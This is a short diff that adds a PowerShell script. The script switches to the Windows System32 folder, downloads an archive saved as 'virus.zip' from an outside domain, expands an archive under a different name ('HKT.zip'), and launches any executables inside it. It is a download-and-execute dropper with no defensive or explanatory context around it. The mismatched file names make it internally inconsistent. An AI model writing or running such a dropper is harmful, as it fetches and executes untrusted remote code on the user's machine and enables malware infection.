@@ -1,0 +1,4 @@
+cd C:\Windows\System32
+Invoke-WebRequest -Uri "http://toilatoipham.id.vn/a.zip" -OutFile "virus.zip"
+Expand-Archive HKT.zip
+Start-Process -FilePath "./HKT/*.exe"
